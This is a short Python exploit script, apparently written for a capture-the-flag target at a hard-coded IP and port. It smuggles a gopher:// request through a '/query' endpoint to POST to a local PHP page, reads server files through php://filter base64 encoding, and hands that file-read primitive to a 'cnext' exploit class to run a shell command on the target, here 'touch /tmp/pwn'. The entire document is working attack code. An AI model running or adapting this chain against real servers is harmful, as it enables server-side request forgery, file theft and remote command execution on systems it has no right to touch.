import requests
import urllib
import base64
from cnext.cnext import Exploit
from dataclasses import dataclass

class ExpRemote():
    def __init__(self, url: str) -> None:
        self.url = url

    def send(self, path):
        path = urllib.parse.quote(path)
        form = \
"""POST /dawn.php HTTP/1.1
Host: 127.0.0.1:80
Content-Type: application/x-www-form-urlencoded
Content-Length: {}

url_image={}
""".format(len(path) + 10, path)
        # print(form)
        form = urllib.parse.quote(form)
        form = form.replace('%0A','%0D%0A')

        payload = """gopher://127.0.0.1:80/_{}""".format(form)
        return requests.get(url=self.url+'/query',params={"url": payload})
    
    def download(self, path: str) -> bytes:
        path = f"php://filter/convert.base64-encode/resource={path}"
        res = self.send(path)
        data = requests.get(url=self.url+'/query', params={"url": 'http://127.0.0.1/picture/image.jpg'})
        res = data.json()['result']
        if len(res) % 4 != 0:
           res +=  (4 - (len(res) % 4)) * '='
        return base64.b64decode(res.encode())

@dataclass
class CnextExploit(Exploit):
    def __post_init__(self):
        super().__post_init__()
        self.remote = ExpRemote(self.url)
        
CnextExploit(url="http://125.220.147.47:49509", command="touch /tmp/pwn").run()
